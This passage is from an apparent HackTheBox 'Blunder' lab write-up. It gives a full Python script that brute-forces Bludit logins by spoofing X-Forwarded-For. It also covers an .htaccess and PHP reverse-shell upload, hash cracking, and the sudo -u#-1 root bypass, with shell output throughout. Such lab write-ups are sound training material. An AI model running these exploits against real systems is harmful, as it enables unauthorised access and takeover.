+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span> <span class="p">(</span><span class="sa">f</span><span class="s">"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># Variable
+</span><span class="n">LoginPage</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span>
+<span class="n">Username_list</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">userlist</span>
+<span class="n">Password_list</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">passlist</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Bludit Auth BF Mitigation Bypass Script by ColdFusionX </span><span class="se">\n</span><span class="s"> '</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">Username</span><span class="p">,</span><span class="n">Password</span><span class="p">):</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">LoginPage</span><span class="p">)</span>
+
+<span class="c1"># Progress Check
+</span>    <span class="n">process</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Brute Force'</span><span class="p">)</span>
+
+<span class="c1">#Getting CSRF token value
+</span>    <span class="n">CSRF</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">CSRF</span> <span class="o">=</span> <span class="n">CSRF</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#Specifying Headers Value
+</span>    <span class="n">headerscontent</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'User-Agent'</span> <span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'</span><span class="p">,</span>
+    <span class="s">'Referer'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">LoginPage</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+    <span class="s">'X-Forwarded-For'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Password</span><span class="si">}</span><span class="s">"</span>
+    <span class="p">}</span>
+
+<span class="c1">#POST REQ data
+</span>    <span class="n">postreqcontent</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'tokenCSRF'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">CSRF</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+    <span class="s">'username'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Username</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+    <span class="s">'password'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Password</span><span class="si">}</span><span class="s">"</span>
+    <span class="p">}</span>
+
+<span class="c1">#Sending POST REQ
+</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">LoginPage</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">postreqcontent</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headerscontent</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+
+<span class="c1">#Printing Username:Password
+</span>    <span class="n">process</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Testing -&gt; {U}:{P}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">U</span> <span class="o">=</span> <span class="n">Username</span><span class="p">,</span> <span class="n">P</span> <span class="o">=</span> <span class="n">Password</span><span class="p">))</span>
+
+<span class="c1">#Conditional loops
+</span>    <span class="k">if</span> <span class="s">'Location'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">"/admin/dashboard"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Location'</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">()</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'SUCCESS !!'</span><span class="p">)</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"Use Credential -&gt; </span><span class="si">{</span><span class="n">Username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">Password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="s">"has been blocked"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Password</span><span class="si">}</span><span class="s"> - Word BLOCKED"</span><span class="p">)</span>
+
+<span class="c1">#Reading User.txt &amp; Pass.txt files
+</span><span class="n">userfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">Username_list</span><span class="p">).</span><span class="n">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">Username</span> <span class="ow">in</span> <span class="n">userfile</span><span class="p">:</span>
+    <span class="n">Username</span> <span class="o">=</span> <span class="n">Username</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="n">passfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">Password_list</span><span class="p">).</span><span class="n">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">Password</span> <span class="ow">in</span> <span class="n">passfile</span><span class="p">:</span>
+    <span class="n">Password</span> <span class="o">=</span> <span class="n">Password</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">login</span><span class="p">(</span><span class="n">Username</span><span class="p">,</span><span class="n">Password</span><span class="p">)</span>
+</pre></table></code></div></div><h4 id="usage">Usage</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ ./exploit.py <span class="nt">-h</span>
+usage: exploit.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-l</span> URL] <span class="o">[</span><span class="nt">-u</span> USERLIST] <span class="o">[</span><span class="nt">-p</span> PASSLIST]
+
+Bludit &lt;<span class="o">=</span> 3.9.2 Auth Bruteforce Mitigation Bypass
+
+optional arguments:
+  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">-l</span> URL, <span class="nt">--url</span> URL     Path to Bludit <span class="o">(</span>Example: http://127.0.0.1/admin/login.php<span class="o">)</span>
+  <span class="nt">-u</span> USERLIST, <span class="nt">--userlist</span> USERLIST
+                        Username Dictionary
+  <span class="nt">-p</span> PASSLIST, <span class="nt">--passlist</span> PASSLIST
+                        Password Dictionary
+
+Exploit Usage :
+./exploit.py <span class="nt">-l</span> http://127.0.0.1/admin/login.php <span class="nt">-u</span> user.txt <span class="nt">-p</span> pass.txt
+./exploit.py <span class="nt">-l</span> http://127.0.0.1/admin/login.php <span class="nt">-u</span> /Directory/user.txt <span class="nt">-p</span> /Directory/pass.txt
+</pre></table></code></div></div><p>On running the exploit with proper arguments, it will display each attempting login credential and on successful login will display the credential to use.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ ./exploit.py <span class="nt">-l</span> http://10.10.10.191/admin/ <span class="nt">-u</span> user.txt <span class="nt">-p</span> pass.txt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bludit Auth BF Mitigation Bypass Script by ColdFusionX
+
+<span class="o">[</span>┘] Brute Force: Testing -&gt; fergus:the
+<span class="o">[</span>&lt;<span class="o">]</span> Brute Force: Testing -&gt; fergus:Load
+<span class="o">[</span>▘] Brute Force: Testing -&gt; fergus:Plugins
+<span class="o">[</span>.] Brute Force: Testing -&gt; fergus:Site
+<span class="o">[</span>◓] Brute Force: Testing -&gt; fergus:Page
+
+<span class="o">[</span>..SNIP..]
+
+<span class="o">[</span>◓] Brute Force: Testing -&gt; fergus:fictional
+<span class="o">[</span>.] Brute Force: Testing -&gt; fergus:character
+<span class="o">[</span>|] Brute Force: Testing -&gt; fergus:RolandDeschain
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SUCCESS <span class="o">!!</span>
+<span class="o">[</span>+] Use Credential -&gt; fergus:RolandDeschain
+</pre></table></code></div></div><p>Great ! We have a username and password to login <code class="language-plaintext highlighter-rouge">fergus:RolandDeschain</code></p><h2 id="shell-as-www-data">Shell as www-data</h2><p>Using <code class="language-plaintext highlighter-rouge">fergus:RolandDeschain</code> we can login successfully.</p><h3 id="php-shell---image-upload">PHP Shell - Image Upload</h3><p>Now that we are authenticated we can replicate the <strong>Code Execution</strong> vulnerability steps mentioned on <a href="https://github.com/bludit/bludit/issues/1081"><strong>Github issue 1081</strong></a> and get ourselves a reverse shell on the box.</p><h4 id="overview">Overview</h4><p>Based on the vulnerability explained on Github, When a PHP file is uploaded, it is first stored inside the temporary location <code class="language-plaintext highlighter-rouge">http://10.10.10.191/bl-content/tmp/</code> , If the extension check is successful it will store the file to the dedicated directory, but if it fails the file sits idle inside the <code class="language-plaintext highlighter-rouge">/tmp</code> folder. But, even though the php file is uploaded on the server, it wont work since <code class="language-plaintext highlighter-rouge">.htaccess</code> file from root directory denies direct access to next directories.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="c"># Deny direct access to the next directories</span>
+RewriteRule ^bl-content/<span class="o">(</span>databases|workspaces|pages|tmp<span class="o">)</span>/.<span class="k">*</span><span class="nv">$ </span>- <span class="o">[</span><span class="nv">R</span><span class="o">=</span>404,L]
+</pre></table></code></div></div><p>Instead, what we can do is upload our own <code class="language-plaintext highlighter-rouge">.htaccess</code> file on the server inside which resides inside <code class="language-plaintext highlighter-rouge">/tmp/</code> directory, which is the same directory that allows us to execute our code. This crafted <code class="language-plaintext highlighter-rouge">.htaccess</code> will turn off Rewrite Engine on the site and tell the server to execute .png file as .php.</p><h4 id="attack-scenario">Attack Scenario</h4><ol><li>Take a PHP reverse shell, change it’s extension to <code class="language-plaintext highlighter-rouge">.png</code>.</li><li>Upload it to the server and change the <code class="language-plaintext highlighter-rouge">uuid</code> value to <code class="language-plaintext highlighter-rouge">../../tmp/cfx</code> which stores the .png file inside <code class="language-plaintext highlighter-rouge">/bl-content/tmp/cfx</code> folder.</li><li>Create a <code class="language-plaintext highlighter-rouge">.htaccess</code> file which says the server to execute .png as .php</li><li>Change it’s extension to <code class="language-plaintext highlighter-rouge">htaccess.png</code> and again rename it to <code class="language-plaintext highlighter-rouge">.htaccess</code> while intercepting the request.</li><li>We’ll get the error as <code class="language-plaintext highlighter-rouge">File type not supported</code> but <code class="language-plaintext highlighter-rouge">.htaccess</code> file will get uploaded inside <code class="language-plaintext highlighter-rouge">/bl-content/tmp/</code> which allows us to run .png file as .php.</li></ol><h3 id="exploitation">Exploitation</h3><h4 id="php-shell-upload">PHP Shell upload</h4><p>PHP reverse shell can be found inside <code class="language-plaintext highlighter-rouge">/usr/share/webshell/php/</code> or <code class="language-plaintext highlighter-rouge">/usr/share/laudanum/php/</code>, same can also be downloaded from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell"><strong>pentestmonkey</strong></a> for Non-Kali users.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ <span class="nb">mv </span>php-reverse-shell.php shell.png
+</pre></table></code></div></div><p>On selecting New content &gt; Image we have the following screen:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/upload.png" alt="upload" /></p><p>Next, we upload and intercept our request on <code class="language-plaintext highlighter-rouge">burp</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/burp1.png" alt="burp1" /></p><p>At the bottom, we change the <code class="language-plaintext highlighter-rouge">uuid</code> value as <code class="language-plaintext highlighter-rouge">../../tmp/cfx</code>, this will create a directory named <code class="language-plaintext highlighter-rouge">cfx</code> inside <code class="language-plaintext highlighter-rouge">tmp</code> and upload <code class="language-plaintext highlighter-rouge">shell.png</code> inside it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/burp2.png" alt="burp2" /></p><p>On successfull upload, we shall see <code class="language-plaintext highlighter-rouge">"message":"Images uploaded."</code> on response.</p><h5 id="htaccess-upload">.htaccess upload</h5><p>Now that our <code class="language-plaintext highlighter-rouge">shell.png</code> is uploaded on the box, we need to access and trigger it.</p><p>We’ll create a <code class="language-plaintext highlighter-rouge">htacces file</code> with following content and change it’s extension to <code class="language-plaintext highlighter-rouge">.png</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ <span class="nb">cat </span>htaccess.png
+RewriteEngine off
+AddType application/x-httpd-php .png
+</pre></table></code></div></div><p>Intercepting the request, changing the file name back to <code class="language-plaintext highlighter-rouge">.htaccess</code> and forwarding the request:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/htaccess.png" alt="htaccess" /></p><p>We get the error as <code class="language-plaintext highlighter-rouge">message":"File type is not supported</code> on response. But it’s fine, our file will still be available to <code class="language-plaintext highlighter-rouge">/bl-content/tmp</code> directory.</p><h4 id="files">Files</h4><p>Visiting <a href="http://10.10.10.191/bl-content/tmp/cfx/">http://10.10.10.191/bl-content/tmp/cfx/</a> we see our shell.png :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/shell.png" alt="shell" /></p><h3 id="reverse-shell">Reverse Shell</h3><p>On triggering <code class="language-plaintext highlighter-rouge">shell.png</code> we get a call back on our <code class="language-plaintext highlighter-rouge">pwncat</code> listener:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blunder
+→ pwncat <span class="nt">-l</span> 8020 <span class="nt">-vv</span>
+INFO: Listening on :::8020 <span class="o">(</span>family 10/IPv6, TCP<span class="o">)</span>
+INFO: Listening on 0.0.0.0:8020 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+INFO: Client connected from 10.10.10.191:54436 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+Linux blunder 5.3.0-53-generic <span class="c">#47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 19:07:44 up  2:03,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shaun    :0       :0               17:04   ?xdm?   1:29   0.00s /usr/lib/gdm3/gdm-x-session <span class="nt">--run-script</span> <span class="nb">env </span><span class="nv">GNOME_SHELL_SESSION_MODE</span><span class="o">=</span>ubuntu /usr/bin/gnome-session <span class="nt">--systemd</span> <span class="nt">--session</span><span class="o">=</span>ubuntu
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ which python
+/usr/bin/python
+$ python -c "import pty;pty.spawn('</span>/bin/bash<span class="s1">')"
+www-data@blunder:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></pre></table></code></div></div><h2 id="elevating-priv-www-data---hugo">Elevating Priv: www-data -&gt; hugo</h2><p>I found <code class="language-plaintext highlighter-rouge">user.txt</code> inside folder of user <code class="language-plaintext highlighter-rouge">hugo</code> and was readable by hugo only.</p><p>Heading to <code class="language-plaintext highlighter-rouge">/var/www/</code>, I searched for anything related to user hugo and found a database config file with some hash in it.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>www-data@blunder:/var/www<span class="nv">$ </span>find <span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-ir</span> hugo
+bludit-3.10.0a/bl-content/databases/users.php:        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+bludit-3.10.0a/bl-content/databases/users.php:        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+find: <span class="s1">'standard output'</span>: Broken pipe
+find: write error
+www-data@blunder:/var/www<span class="nv">$ </span><span class="nb">cat </span>bludit-3.10.0a/bl-content/databases/users.php
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
+        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
+        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
+        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
+        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
+        <span class="s2">"github"</span>: <span class="s2">""</span>,
+        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>In todo.txt, we saw a note saying remove old users. Seems Admin decided to update the CMS but forgot to remove old config files.</p><ul><li>Password Hash: <code class="language-plaintext highlighter-rouge">faca404fd5c0a31cf1897b823c695c85cffeb98d</code></li></ul><p>Using <a href="https://crackstation.net/"><strong>Crackstation</strong></a> we have the cracked hash as <code class="language-plaintext highlighter-rouge">Password120</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blunder/crack.png" alt="crack" /></p><h3 id="su---hugo">SU - hugo</h3><p>Using <code class="language-plaintext highlighter-rouge">Password120</code> we can <code class="language-plaintext highlighter-rouge">su</code> to user hugo:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>www-data@blunder:/var/www<span class="nv">$ </span>su hugo -
+su hugo -
+Password: Password120
+hugo@blunder:/var/www<span class="err">$</span>
+</pre></table></code></div></div><h4 id="grabbing-usertxt">Grabbing user.txt</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>hugo@blunder:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+6633fe5a84ee57d<span class="k">*****************</span>
+
+</pre></table></code></div></div><h2 id="elevating-priv-hugo---root">Elevating Priv: hugo -&gt; root</h2><h3 id="enumeration">Enumeration</h3><p>Checking if our user has any special privileges using <code class="language-plaintext highlighter-rouge">sudo -l</code> results something very interesting:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>hugo@blunder:/var/www<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Password:
+Matching Defaults entries <span class="k">for </span>hugo on blunder:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User hugo may run the following commands on blunder:
+    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash
+</pre></table></code></div></div><p>It means user Hugo can run <code class="language-plaintext highlighter-rouge">/bin/bash</code> as any user except root, Let’s test it out:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> shaun /bin/bash
+<span class="nb">sudo</span> <span class="nt">-u</span> shaun /bin/bash
+Password: Password120
+
+shaun@blunder:/home/hugo<span class="nv">$ </span><span class="nb">exit
+
+</span>hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> root /bin/bash
+<span class="nb">sudo</span> <span class="nt">-u</span> root /bin/bash
+Sorry, user hugo is not allowed to execute <span class="s1">'/bin/bash'</span> as root on blunder.
+</pre></table></code></div></div><h3 id="cve-2019-14287">CVE-2019-14287</h3><p>Last year in 2019, a sudo vulnerability was discovered which allowed a user to execute command as root even if the user was disallowed to do so.</p><blockquote><p>The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the “sudoers configuration” explicitly disallows the root access.</p></blockquote><p>Sudo version prior to 1.8.28 are impacted by this vulnerability.</p><p>On checking the <code class="language-plaintext highlighter-rouge">sudo</code> version of our machine, We can see the version is <code class="language-plaintext highlighter-rouge">1.8.25</code> which should be vulnerable:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>hugo@blunder:/var/www<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">--version</span>
+Sudo version 1.8.25p1
+Sudoers policy plugin version 1.8.25p1
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.25p1
+</pre></table></code></div></div><h3 id="shell-as-root">Shell as root</h3><p>I found this <a href="https://www.exploit-db.com/exploits/47502"><strong>PoC</strong></a> for exploiting this vuln, using <code class="language-plaintext highlighter-rouge">-u &lt;shaun&gt;</code> with sudo we can say which user to run as. We can also do the same using <code class="language-plaintext highlighter-rouge">-u#&lt;uid&gt;</code> with uid of user.</p><p>If we specify 0 as uid which is basically the uid for root, it returns the user can’t run command as root. But as per PoC, if we specify <code class="language-plaintext highlighter-rouge">uid as -1</code> it will run the command as root.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+<span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+Password: Password120
+
+root@blunder:/home/hugo# <span class="nb">whoami
+whoami
+</span>root
+</pre></table></code></div></div><p>Bingo ! It worked.</p><h4 id="grabbing-roottxt">Grabbing root.txt</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>root@blunder:/root# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+ef1d3e631dbca18<span class="k">*****************</span>
+
+</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux-machines/'>Linux Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/blunder/" class="post-tag no-text-decoration" >Blunder</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/ffuf/" class="post-tag no-text-decoration" >ffuf</a> <a href="/tags/masscan/" class="post-tag no-text-decoration" >masscan</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/bludit/" class="post-tag no-text-decoration" >bludit</a> <a href="/tags/bruteforce/" class="post-tag no-text-decoration" >bruteforce</a> <a href="/tags/bypass/" class="post-tag no-text-decoration" >bypass</a> <a href="/tags/cve-2019-17240/" class="post-tag no-text-decoration" >CVE-2019-17240</a> <a href="/tags/cewl/" class="post-tag no-text-decoration" >cewl</a> <a href="/tags/image-upload/" class="post-tag no-text-decoration" >Image-upload</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a> <a href="/tags/.png/" class="post-tag no-text-decoration" >.png</a> <a href="/tags/x-forwarded-for/" class="post-tag no-text-decoration" >X-Forwarded-For</a> <a href="/tags/uuid/" class="post-tag no-text-decoration" >uuid</a> <a href="/tags/htaccess/" class="post-tag no-text-decoration" >htaccess</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/csrf-token/" class="post-tag no-text-decoration" >csrf-token</a> <a href="/tags/cve-2019-14287/" class="post-tag no-text-decoration" >CVE-2019-14287</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/-u%23-1/" class="post-tag no-text-decoration" >-u#-1</a> <a href="/tags/bludit-3.9.2/" class="post-tag no-text-decoration" >bludit-3.9.2</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Blunder Writeup - ColdFusionX&url=http://localhost:4000/posts/Blunder-HTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Blunder Writeup - 